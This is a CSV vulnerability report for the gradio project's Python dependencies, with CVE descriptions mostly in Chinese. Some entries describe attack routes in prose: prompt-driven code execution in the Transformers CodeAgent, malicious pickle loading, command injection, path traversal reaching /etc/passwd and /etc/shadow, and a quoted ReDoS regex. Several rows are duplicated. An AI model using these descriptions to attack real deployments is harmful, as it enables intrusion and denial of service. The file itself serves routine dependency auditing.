gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2024-51751,CWE-22,2024-11-06,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。它允许开发人员通过简单的方式展示和共享他们的模型或应用程序。Gradio 5.0.0 至 5.4.0 版本存在文件读取漏洞，其根本原因在于 File 或 UploadButton 组件在预览文件内容功能实现上的不当处理。攻击者可以滥用这个功能，读取应用服务器上的任意文件，前提是他们拥有应用的访问权限。,2,0
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2024-10624,CWE-1333,,Gradio 是一个开源 Python 库，旨在通过友好的 Web 界面来展示机器学习模型。受影响的版本为 git commit 98cbcae。该漏洞源于 gr.Datetime 组件中使用的正则表达式 `^(?:\s*now\s*(?:-\s*(\d+)\s*([dmhs]))?)?\s*$`，在 Python 的默认 regex 引擎中，这个正则表达式在处理某些特制输入时可能需要多项式时间来匹配。攻击者可以通过发送特制的 HTTP 请求来利用这一点，从而使 Gradio 进程消耗 100% 的 CPU，可能导致服务器拒绝服务 (DoS) 状态。,2,1
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2024-10648,CWE-29,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae。该漏洞源于 Gradio Audio 组件的路径遍历漏洞，攻击者能够控制音频文件格式，导致任意文件内容被删除。当存档文件被精心构造时，恶意的文件名可以遍历到提取目录之外，覆盖其他重要文件，例如配置文件或可执行文件，从而导致更为严重的影响。攻击者可以通过在 zip 文件中包含恶意路径名来利用此漏洞。,2,1
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2024-10569,CWE-475,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae，在 dataframe 组件中存在安全漏洞。该漏洞源于组件使用 pd.read_csv 处理输入值，允许上传压缩文件。攻击者可以利用此漏洞，通过上传恶意构造的 zip 炸弹，导致服务器崩溃和拒绝服务（DoS）。,2,1
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2025-0187,CWE-400,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。Gradio 版本 0.39.1 存在一个资源管理错误漏洞，该漏洞源于文件上传功能在处理带有大文件名的表单数据时的不当处理。攻击者可以通过发送包含过大文件名的 payload，使得服务器变得不响应，从而导致合法用户无法访问该服务。,2,1
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2025-5320,CWE-345 CWE-346,2025-05-29,在Gradio应用中的gradio版本5.29.1及其之前的版本中，发现了一个被标记为存在问题的漏洞。这个漏洞存在于CORS处理程序中的is_valid_origin函数。通过操纵localhost_aliases参数可以导致来源验证错误。,3,0
gradio-app_gradio,gradio,">=5.0,<6.0",True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
gradio-app_gradio,authlib,,True,CVE-2024-37568,CWE-347 CWE-284,2024-06-09,在 1.3.1 之前的 lepture Authlib 版本中，存在算法混淆漏洞。如果在 jwt.decode 调用中未指定算法，HMAC 验证会允许使用任何非对称公钥。这种漏洞类似于 CVE-2022-29217 和 CVE-2024-33663。,2,2
gradio-app_gradio,authlib,,True,CVE-2022-39175,CWE-287,2022-12-02,"## Overview
[authlib](https://pypi.org/project/Authlib/) is a library in building OAuth and OpenID Connect servers.

Affected versions of this package are vulnerable to Authentication Bypass in `rfc7515/jws.py` and `rfc7515/jwe.py`, which can succeed without a JWS key provided.
## Remediation
Upgrade `authlib` to version 1.1.0 or higher.
## References
- [GitHub Commit](https://github.com/lepture/authlib/commit/80b0808263c6ce88335532b78e62bf2522593390)
- [Vulnerability Note](https://docs.authlib.org/en/latest/community/security.html#previous-cves)
",3,2
gradio-app_gradio,authlib,,True,CVE-2022-39174,CWE-453,2022-12-02,Authlib 是一个用于构建 OAuth 和 OpenID Connect 服务器的库。其主要功能是帮助开发者实现认证和授权流程。在此库的 JOSE（JSON Object Signing and Encryption）实现中，存在不安全的默认值漏洞，这可能导致在没有指定 JWS（JSON Web Signature）算法的情况下被调用。由于缺乏安全的默认配置，攻击者可能利用这一点来实施攻击。,3,2
gradio-app_gradio,authlib,,True,CVE-2025-59420,CWE-345 CWE-863,2025-09-22,Authlib 是一个用于构建 OAuth 和 OpenID Connect 服务器的 Python 库。其 JWS（JSON Web Signature）验证功能在 1.6.3 版本之前，接受了包含未知关键标头参数（crit）的令牌，这违反了 RFC 7515 的“必须理解”语义要求。根据 RFC 7515，接收方必须理解并强制执行 crit 标头中列出的每个参数，否则必须拒绝令牌。然而，Authlib 未正确执行此规则，允许攻击者生成包含未知 crit 标头的签名令牌（例如 bork 或 cnf），这些令牌会被严格验证器拒绝，但被 Authlib 接受。在异构语言环境（如包含 Java、Node.js 和 Python 服务的环境）中，这种行为可能导致验证流程出现分歧，从而绕过授权策略，允许重放攻击或权限提升。,2,-2
gradio-app_gradio,authlib,,True,CVE-2025-61920,CWE-20 CWE-400 CWE-770,2025-10-10,Authlib 是一个用于构建 OAuth 和 OpenID Connect 服务器的 Python 库。其 JOSE 实现允许接收未限制大小的 JWS/JWT 头部和签名段。远程攻击者可以构造一个 token，其 base64url 编码的头部或签名段可扩展至数百兆字节。在验证过程中，Authlib 会解析整个输入，导致 CPU 和内存资源消耗过度，从而造成拒绝服务。漏洞的根本原因在于缺乏对输入大小的限制，攻击者利用未限制的解析和处理逻辑，通过构造特大数据段引发系统资源耗尽。,2,2
gradio-app_gradio,authlib,,True,CVE-2025-62706,CWE-400 CWE-770,2025-10-11,"Authlib是Authlib开源的一个构建 OAuth 和 OpenID Connect 服务器的终极 Python 库。
Authlib 1.6.5之前版本存在安全漏洞，该漏洞源于JWE zip=DEF路径执行无限制DEFLATE解压缩，可能导致内存和CPU耗尽，造成拒绝服务攻击。",2,0
gradio-app_gradio,brotli,>=1.1.0,True,CVE-2025-6176,CWE-400,2025-10-31,Scrapy 是一个常用的爬虫框架，用于从网站提取数据并处理网络请求。其支持多种压缩算法以提高数据传输效率。漏洞发生在 Brotli 解压缩实现中，Brotli 是一种高效的压缩算法，广泛用于数据压缩和解压场景。该漏洞的成因是 Brotli 解压缩实现中的保护机制未能有效防御解压炸弹攻击，特别是对于由零填充数据组成的高压缩比数据未能进行充分的限制。攻击者可以通过构造特定的 Brotli 压缩数据包，在目标服务器解压时消耗大量内存（需要的内存可能超过 80GB），从而导致系统资源耗尽并引发拒绝服务。,2,2
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
